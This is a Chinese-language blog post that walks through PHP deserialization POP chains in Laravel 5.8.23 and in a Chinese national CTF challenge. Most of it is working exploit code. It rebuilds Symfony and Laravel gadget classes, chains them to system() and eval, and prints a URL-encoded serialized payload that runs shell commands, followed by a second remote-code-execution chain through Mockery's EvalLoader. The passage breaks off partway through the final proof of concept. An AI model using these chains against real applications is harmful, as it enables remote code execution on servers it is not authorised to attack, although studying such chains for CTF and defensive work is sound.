    <updated>2020-06-07T06:28:28.930Z</updated>
    
    <content type="html"><![CDATA[<p><strong>本文内容：</strong></p><p><strong>Laravel5.8.23</strong>反序列化POP链分析与利用</p><a id="more"></a><h1 id="国赛POP链分析"><a href="#国赛POP链分析" class="headerlink" title="国赛POP链分析"></a>国赛POP链分析</h1><p>一般反序列化的入口为<code>__destruct</code>函数，这里全局搜一下这个函数</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200311225656.png" alt=""></p><p>一共76个函数，有点点吓人，这里为了复现，直接找了当时国赛的<code>Writeup</code>来得知入口函数在</p><p><code>vendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/TagAwareAdapter.php</code>当中</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200311225854.png" alt=""></p><p>这里开始分析</p><p>首先追踪<code>commit</code>函数</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">commit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;invalidateTags([]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续追踪<code>invalidateTags</code>函数</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">invalidateTags</span><span class="params">(array $tags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  $ok = <span class="keyword">true</span>;</span><br><span class="line">  $tagsByKey = [];</span><br><span class="line">  $invalidatedTags = [];</span><br><span class="line">  <span class="keyword">foreach</span> ($tags <span class="keyword">as</span> $tag) &#123;</span><br><span class="line">    CacheItem::validateKey($tag);</span><br><span class="line">    $invalidatedTags[$tag] = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;deferred) &#123;</span><br><span class="line">    $items = <span class="keyword">$this</span>-&gt;deferred;</span><br><span class="line">    <span class="keyword">foreach</span> ($items <span class="keyword">as</span> $key =&gt; $item) &#123;</span><br><span class="line">      <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;pool-&gt;saveDeferred($item)) &#123;</span><br><span class="line">        <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;deferred[$key]);</span><br><span class="line">        $ok = <span class="keyword">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $f = <span class="keyword">$this</span>-&gt;getTagsByKey;</span><br><span class="line">    $tagsByKey = $f($items);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;deferred = [];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  $tagVersions = <span class="keyword">$this</span>-&gt;getTagVersions($tagsByKey, $invalidatedTags);</span><br><span class="line">  $f = <span class="keyword">$this</span>-&gt;createCacheItem;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">foreach</span> ($tagsByKey <span class="keyword">as</span> $key =&gt; $tags) &#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;pool-&gt;saveDeferred($f(<span class="keyword">static</span>::TAGS_PREFIX.$key, array_intersect_key($tagVersions, $tags), $items[$key]));</span><br><span class="line">  &#125;</span><br><span class="line">  $ok = <span class="keyword">$this</span>-&gt;pool-&gt;commit() &amp;&amp; $ok;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ($invalidatedTags) &#123;</span><br><span class="line">    $f = <span class="keyword">$this</span>-&gt;invalidateTags;</span><br><span class="line">    $ok = $f(<span class="keyword">$this</span>-&gt;tags, $invalidatedTags) &amp;&amp; $ok;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> $ok;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里看到了对<code>deferred</code>的调用，这里<code>deferred</code>声明为<code>private $deferred = []</code></p><p>可以看到在对<code>deferred</code>赋值给<code>items</code>后，在14行对<code>items</code>的值<code>items</code>逐次调用了<code>saveDeferred</code>函数</p><p>这里需要寻找可用的<code>saveDeferred</code>函数作为<code>POP</code>链构造</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200312122601.png" alt=""></p><p>这里全局找一下这个函数，26文件得依次看，直到能够确定存在命令执行或者文件操作才能算构造<code>POP</code>链成功</p><p>这里找到</p><p><code>/Applications/MAMP/htdocs/source/vendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/ProxyAdapter.php</code>下的<code>saveDeferred</code>函数</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200312122753.png" alt=""></p><p>继续跟进<code>doSave</code>函数，可以看到存在动态函数执行</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200312122850.png" alt=""></p><p>其中<code>$this-&gt;setInnerItem</code>来自于<code>private $setInnerItem;</code>可以直接赋值</p><p><code>$innerItem</code>来自于</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ($item[<span class="string">"\0*\0poolHash"</span>] === <span class="keyword">$this</span>-&gt;poolHash &amp;&amp; $item[<span class="string">"\0*\0innerItem"</span>]) &#123;</span><br><span class="line">  $innerItem = $item[<span class="string">"\0*\0innerItem"</span>];</span><br></pre></td></tr></table></figure><p><code>$this-&gt;poolHash</code>来自于<code>private $poolHash;</code>可控</p><p>这里的<code>$item</code>一直溯源的话，可以看到在<code>invalidateTags</code>函数中</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;deferred) &#123;</span><br><span class="line">  $items = <span class="keyword">$this</span>-&gt;deferred;</span><br><span class="line">  <span class="keyword">foreach</span> ($items <span class="keyword">as</span> $key =&gt; $item) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;pool-&gt;saveDeferred($item)) &#123;</span><br></pre></td></tr></table></figure><p>这里的<code>$item</code>来自于<code>$items</code>，而<code>$items</code>来自于<code>$this-&gt;deferred</code></p><p><code>$this-&gt;deferred</code>为<code>private $deferred = [];</code>是个数组</p><p>这里我想过直接将<code>\0*\0poolHash</code>和<code>\0*\0innerItem</code>直接当数组传进去</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/41D268E5273E54058EA94878BF927143.jpg" alt=""></p><p>但这样会报错，而且直接在反序列化处报错</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200312141329.png" alt=""></p><p>那么就换个思路，找一个类，其中包括<code>pookHash</code>和<code>innerItem</code>两个属性</p><p>从而<code>deferred</code>设置为包含这个类的数组</p><p>这里找到一个类</p><p><code>/Applications/MAMP/htdocs/source/vendor/symfony/symfony/src/Symfony/Component/Cache/CacheItem.php</code></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200312142233.png" alt=""></p><p>可以看到包括这两个需要的属性</p><p>那么就可以构造这个类</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>&#123;</span><br><span class="line">  <span class="title">final</span> <span class="title">class</span> <span class="title">CacheItem</span>&#123;</span><br><span class="line">    <span class="title">protected</span> $<span class="title">innerItem</span>;</span><br><span class="line">    <span class="keyword">protected</span> $poolHash;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__constuct</span><span class="params">($innerItem,$poolHash)</span></span>&#123;</span><br><span class="line">      <span class="keyword">$this</span>-&gt;innerItem = $innerTtem;</span><br><span class="line">      <span class="keyword">$this</span>-&gt;poolHash = $poolHash;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">$CacheItemObj = <span class="keyword">new</span> Symfony\Component\Cache\CacheItem(<span class="string">"CMD"</span>,<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>然后对<code>$setInnerItem</code>和<code>$poolHash</code>这两个<code>\Symfony\Component\Cache\Adapter\ProxyAdapter</code>中的属性进行赋值</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> \<span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Adapter</span>&#123;</span><br><span class="line">  <span class="title">class</span> <span class="title">ProxyAdapter</span>&#123;</span><br><span class="line">    <span class="title">private</span> $<span class="title">setInnerItem</span>;</span><br><span class="line">    <span class="keyword">private</span> $poolHash;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__contruct</span><span class="params">($setInnerItem,$poolHash)</span></span>&#123;</span><br><span class="line">      <span class="keyword">$this</span>-&gt;setInnerItem = $setInnerItem;</span><br><span class="line">      <span class="keyword">$this</span>-&gt;poolHash = $poolHash;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">$ProxyAdapterObj = <span class="keyword">new</span> \Symfony\Component\Cache\Adapter\ProxyAdapter(<span class="string">"system"</span>,<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>这里解释一下为什么要使用<code>system</code>函数</p><p>在最后命令执行部分代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">$this</span>-&gt;setInnerItem)($innerItem, $item);</span><br></pre></td></tr></table></figure><p>这里的<code>$setInnerItem</code>要求是命令执行函数，而后面的<code>$innerItem</code>和<code>$item</code></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200312143530.png" alt=""></p><p>而<code>system</code>函数完美符合上面要求，因此选择<code>system</code>函数</p><p>然后回到<code>\Symfony\Component\Cache\Adapter\TagAwareAdapter</code>当中的<code>invalidateTags</code>函数</p><p>这里根据上面所说的<code>$deferred</code>-&gt;<code>$items</code>-&gt;<code>$item</code>-&gt;<code>$item[&#39;\0*\0poolHash&#39;]</code>&amp;<code>$item[&#39;\0*\0innerItem&#39;]</code>传递链</p><p>我们这里把<code>$this-&gt;deferred</code>设置为我们刚才构造的<code>$ProxyAdapterObj</code>即可，记得以数组形式传递进去</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200312150717.png" alt=""></p><p>同时<code>$pool</code>要设置为我们存在<code>saveDeferred</code>函数的那个类<code>\Symfony\Component\Cache\Adapter\ProxyAdapter</code></p><p>这里直接传入我们刚才已经生成的对象<code>$ProxyAdapterObj</code>即可</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> \<span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Adapter</span>&#123;</span><br><span class="line">  <span class="title">class</span> <span class="title">TagAwareAdapter</span>&#123;</span><br><span class="line">    <span class="title">private</span> $<span class="title">deferred</span> = [];</span><br><span class="line">    <span class="keyword">private</span> $pool;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($deferred)</span></span>&#123;</span><br><span class="line">      <span class="keyword">$this</span>-&gt;deferred = $deferred;</span><br><span class="line">      <span class="keyword">$this</span>-&gt;pool = $pool;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">$TagAwareAdapterObj = <span class="keyword">new</span> \Symfony\Component\Cache\Adapter\TagAwareAdapter(<span class="keyword">array</span>($ProxyAdapterObj),$ProxyAdapterObj)；</span><br></pre></td></tr></table></figure><p>因此，最终的<code>POP</code>链构造如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>&#123;</span><br><span class="line">    <span class="title">final</span> <span class="title">class</span> <span class="title">CacheItem</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">innerItem</span>;</span><br><span class="line">        <span class="keyword">protected</span> $poolHash;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($innerItem,$poolHash)</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;innerItem = $innerItem;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;poolHash = $poolHash;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Adapter</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">ProxyAdapter</span>&#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">setInnerItem</span>;</span><br><span class="line">        <span class="keyword">private</span> $poolHash;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($setInnerItem,$poolHash)</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;setInnerItem = $setInnerItem;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;poolHash = $poolHash;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Adapter</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">TagAwareAdapter</span>&#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">deferred</span> = [];</span><br><span class="line">        <span class="keyword">private</span> $pool;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($deferred,$pool)</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;deferred = $deferred;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;pool = $pool;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $<span class="title">CacheItemObj</span> = <span class="title">new</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">CacheItem</span>("<span class="title">whoami</span>",1);</span><br><span class="line">    $ProxyAdapterObj = <span class="keyword">new</span> Symfony\Component\Cache\Adapter\ProxyAdapter(<span class="string">"system"</span>,<span class="number">1</span>);</span><br><span class="line">    $TagAwareAdapterObj = <span class="keyword">new</span> Symfony\Component\Cache\Adapter\TagAwareAdapter(<span class="keyword">array</span>($CacheItemObj),$ProxyAdapterObj);</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($TagAwareAdapterObj));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O%<span class="number">3</span>A47%<span class="number">3</span>A%<span class="number">22</span>Symfony%<span class="number">5</span>CComponent%<span class="number">5</span>CCache%<span class="number">5</span>CAdapter%<span class="number">5</span>CTagAwareAdapter%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A57%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>Symfony%<span class="number">5</span>CComponent%<span class="number">5</span>CCache%<span class="number">5</span>CAdapter%<span class="number">5</span>CTagAwareAdapter%<span class="number">00</span>deferred%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bi%<span class="number">3</span>A0%<span class="number">3</span>BO%<span class="number">3</span>A33%<span class="number">3</span>A%<span class="number">22</span>Symfony%<span class="number">5</span>CComponent%<span class="number">5</span>CCache%<span class="number">5</span>CCacheItem%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A12%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>innerItem%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">22</span>ls%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A11%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>poolHash%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A1%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>Ds%<span class="number">3</span>A53%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>Symfony%<span class="number">5</span>CComponent%<span class="number">5</span>CCache%<span class="number">5</span>CAdapter%<span class="number">5</span>CTagAwareAdapter%<span class="number">00</span>pool%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A44%<span class="number">3</span>A%<span class="number">22</span>Symfony%<span class="number">5</span>CComponent%<span class="number">5</span>CCache%<span class="number">5</span>CAdapter%<span class="number">5</span>CProxyAdapter%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A58%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>Symfony%<span class="number">5</span>CComponent%<span class="number">5</span>CCache%<span class="number">5</span>CAdapter%<span class="number">5</span>CProxyAdapter%<span class="number">00</span>setInnerItem%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>system%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A54%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>Symfony%<span class="number">5</span>CComponent%<span class="number">5</span>CCache%<span class="number">5</span>CAdapter%<span class="number">5</span>CProxyAdapter%<span class="number">00</span>poolHash%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A1%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>D/Applications/MAMP/htdocs/source/payload.php:<span class="number">37</span>:</span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200312160044.png" alt=""></p><p>下面大概是<code>POP</code>链的一个调用途径：</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200312150553.png" alt=""></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200312150616.png" alt=""></p><h1 id="实际5-8-23POP链分析"><a href="#实际5-8-23POP链分析" class="headerlink" title="实际5.8.23POP链分析"></a>实际5.8.23POP链分析</h1><p>这个版本的反序列化链在</p><p><code>/Applications/MAMP/htdocs/source/vendor/laravel/framework/src/Illuminate/Broadcasting/PendingBroadcast.php</code></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200312171313.png" alt=""></p><p>去掉注释即可</p><p>这里要寻找一个类包含<code>dispatch</code>这个方法 并且可以利用</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200312173329.png" alt=""></p><p>这里随便翻了一下，就看到一个<code>dispatch</code>类存在很明显的<code>$command</code>参数</p><p>进去看看</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200312173939.png" alt=""></p><p>这里看第二个<code>if</code>判断条件</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">commandShouldBeQueued</span><span class="params">($command)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> $command <span class="keyword">instanceof</span> ShouldQueue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要满足<code>$command</code>是否实现了<code>shouldQueue</code>的接口</p><p>这里全局搜一下实现了<code>shouldQueue</code>接口的类</p><p>这里找到四个类</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200312174943.png" alt=""></p><p>继续追踪<code>dispatchToQueue</code>函数</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200312175150.png" alt=""></p><p>明显看到<code>$queue = call_user_func($this-&gt;queueResolver, $connection);</code></p><p>这里<code>$this-&gt;queueResolver</code>可控，<code>$connection = $command-&gt;connection</code></p><p><code>$command</code>来自于<code>$this-&gt;event</code>可控</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;events-&gt;dispatch(<span class="keyword">$this</span>-&gt;event);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在就要寻找一个实现了<code>shouldQueue</code>接口并且存在<code>$connection</code>的类</p><p>最后发现<code>QueuedCommand</code>这个类满足条件</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">QueuedCommand</span> <span class="keyword">implements</span> <span class="title">ShouldQueue</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Dispatchable</span>, <span class="title">Queueable</span>;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="keyword">trait</span> Queueable</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The name of the connection the job should be sent to.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> string|null</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> $connection;</span><br></pre></td></tr></table></figure><p>现在可以控制任意类的方法了，那就找一个能够执行代码的类方法</p><p>这边找到一个可以执行<code>eval</code>并且没有多余利用条件的类</p><p><code>/Applications/MAMP/htdocs/source/vendor/mockery/mockery/library/Mockery/Loader/EvalLoader.php</code></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200312191027.png" alt=""></p><p>这边不让<code>if</code>判断生效就可以</p><p>这里进入<code>MockDefinition</code>类</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MockDefinition</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $config;</span><br><span class="line">    <span class="keyword">protected</span> $code;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getClassName</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;config-&gt;getName();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getCode</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;code;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里<code>$config</code>和<code>$code</code>可控</p><p>找一个类的<code>getName</code>返回的不是类即可</p><p><code>/Applications/MAMP/htdocs/source/vendor/nikic/php-parser/lib/PhpParser/Node/Scalar/MagicConst/Method.php</code></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200312192222.png" alt=""></p><p>那么就来构造<code>POP</code>链</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">PhpParser</span>\<span class="title">Node</span>\<span class="title">Scalar</span>\<span class="title">MagicConst</span>&#123;</span><br><span class="line">  <span class="title">class</span> <span class="title">Method</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">$<span class="title">MethodObj</span> = <span class="title">new</span> <span class="title">PhpParser</span>\<span class="title">Node</span>\<span class="title">Scalar</span>\<span class="title">MagicConst</span>\<span class="title">Method</span>();</span><br></pre></td></tr></table></figure><p>用来返回<code>getName</code>使<code>if</code>判断失效</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">Mockery</span>\<span class="title">Generator</span>&#123;</span><br><span class="line">  <span class="title">class</span> <span class="title">MockDefinition</span>&#123;</span><br><span class="line">    <span class="title">protected</span> $<span class="title">config</span>;</span><br><span class="line">    <span class="keyword">protected</span> $code;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($config,$code)</span></span>&#123;</span><br><span class="line">      <span class="keyword">$this</span>-&gt;config = $config;</span><br><span class="line">      <span class="keyword">$this</span>-&gt;code = $code;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$MockDefinitionObj = <span class="keyword">new</span> Mockery\Generator\MockDefinition($MethodObj,<span class="string">"&lt;?php system('ls');?&gt;"</span>);</span><br></pre></td></tr></table></figure><p>这里对命令执行部分构造完毕</p><p>然后就是对调用了<code>MockDefinition</code>类的<code>EvalLoader</code>类进行实例化</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">Mockery</span>\<span class="title">Loader</span>&#123;</span><br><span class="line">  <span class="title">class</span> <span class="title">EvalLoader</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">$<span class="title">EvalLoaderObj</span> = <span class="title">new</span> <span class="title">Mockery</span>\<span class="title">Loader</span>\<span class="title">EvalLoader</span>();</span><br></pre></td></tr></table></figure><p>然后回到我们的<code>call_user_func</code>函数那里</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200312193604.png" alt=""></p><p>这里需要同时对<code>$this-&gt;queueResolver和$connection</code>进行构造</p><p>我们先构造<code>$this-&gt;queueResolver</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Bus</span>&#123;</span><br><span class="line">  <span class="title">class</span> <span class="title">Dispatcher</span>&#123;</span><br><span class="line">    <span class="title">protected</span> $<span class="title">queueResolver</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($queueResolver)</span></span>&#123;</span><br><span class="line">      <span class="keyword">$this</span>-&gt;queueResolver = $queueResolver;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">$DispatcherObj = <span class="keyword">new</span> Illuminate\Bus\Dispatcher(<span class="keyword">array</span>($EvalLoaderObj,<span class="string">'load'</span>);<span class="comment">//这一步是把eval传过来</span></span><br></pre></td></tr></table></figure><p>这里要注意因为要传入给<code>call_user_func</code>函数的函数是<code>EvalLoader</code>类中的<code>load</code>函数，所以得通过数组指向<code>load</code>函数</p><p>接下来是对<code>connection</code>的处理，我们上面分析过他在<code>QueuedCommand</code>类中，直接构造即可</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Console</span>&#123;</span><br><span class="line">  <span class="title">class</span> <span class="title">QueuedCommand</span>&#123;</span><br><span class="line">    <span class="title">public</span> $<span class="title">connection</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($connection)</span></span>&#123;</span><br><span class="line">      <span class="keyword">$this</span>-&gt;connection = $connection;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">$QueuedCommandObj = <span class="keyword">new</span> Illuminate\Foundation\Console\QueuedCommand($MockDefinitionObj);</span><br></pre></td></tr></table></figure><p>然后回到对<code>$command</code>的构造上，这里就是对<code>$this-&gt;event</code>的构造</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span>&#123;</span><br><span class="line">  <span class="title">class</span> <span class="title">PendingBroadcast</span>&#123;</span><br><span class="line">    <span class="title">protected</span> $<span class="title">events</span>;</span><br><span class="line">    <span class="keyword">protected</span> $event;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($events,$event)</span></span>&#123;</span><br><span class="line">      <span class="keyword">$this</span>-&gt;events = $events;</span><br><span class="line">      <span class="keyword">$this</span>-&gt;event = $event;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">$PendingBroadcastObj = <span class="keyword">new</span> Illuminate\Broadcasting\PendingBroadcast($DispatcherObj,$QueuedCommandObj);</span><br></pre></td></tr></table></figure><p>分块解析完毕，那么就合成完整的<code>POC</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">PhpParser</span>\<span class="title">Node</span>\<span class="title">Scalar</span>\<span class="title">MagicConst</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Method</span></span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title">namespace</span> <span class="title">Mockery</span>\<span class="title">Generator</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">MockDefinition</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">config</span>;</span><br><span class="line">        <span class="keyword">protected</span> $code;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($config, 